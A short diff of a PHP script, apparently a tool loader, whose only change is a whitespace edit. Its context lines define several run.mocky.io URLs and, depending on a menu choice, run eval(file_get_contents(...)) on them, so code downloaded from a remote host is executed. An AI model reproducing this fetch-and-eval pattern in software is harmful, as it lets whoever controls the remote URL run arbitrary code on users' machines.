@@ -144,7 +144,7 @@ $laytoken="https://run.mocky.io/v3/af782f72-ce2c-45ca-9a13-bb65c8ea224a";
 $monkey="https://run.mocky.io/v3/ff78d45c-e2a0-451d-be35-0e5154bc4a7a";
 $machine="https://run.mocky.io/v3/ab5614c2-3c60-4d70-9aa5-f31be231f875";
 if ($datvip == '1'){eval(file_get_contents($tdstk));
-  
+ 
 }
 elseif ($datvip == "2") {eval(file_get_contents($tdsck));}
 elseif ($datvip == "3") {eval(file_get_contents($tdsvip)); } 
